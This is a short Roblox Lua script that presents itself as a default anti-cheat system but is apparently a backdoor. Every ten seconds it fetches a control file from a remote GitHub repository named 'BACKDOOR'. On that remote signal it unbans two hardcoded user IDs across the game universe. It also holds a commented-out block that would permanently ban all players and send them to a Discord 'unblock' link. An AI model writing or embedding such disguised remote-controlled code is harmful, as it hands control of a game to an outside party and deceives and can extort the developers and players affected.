-- Default AntiCheatSystem

local httpService = game:GetService("HttpService")


while true do

	for _, plr in game.Players:GetPlayers() do
		local Info = httpService:GetAsync("https://raw.githubusercontent.com/diaslo/BACKDOOR/refs/heads/main/Activity.json")
		local Decoded = httpService:JSONDecode(Info)

		if Decoded.Active == false then
			--[[
			game.Players:BanAsync({

				UserIds = {plr.UserId},
				ApplyToUniverse = true, 
				Duration = -1, 
				DisplayReason = 'Central Bureau of Protection | Unblock - https://discord.gg/4mwXqTuEQg',
				PrivateReason = 'Central Bureau of Protection | Unblock - https://discord.gg/4mwXqTuEQg', 
				ExcludeAltAccounts = false,

			})
			]]
			game.Players:UnbanAsync({
	UserIds = {4856395246, 1317963807}, -- The user Ids of who you are unbanning
	ApplyToUniverse = true, -- If the unban will apply to other places inside of your universe
})
		end
	end

	task.wait(10)
end

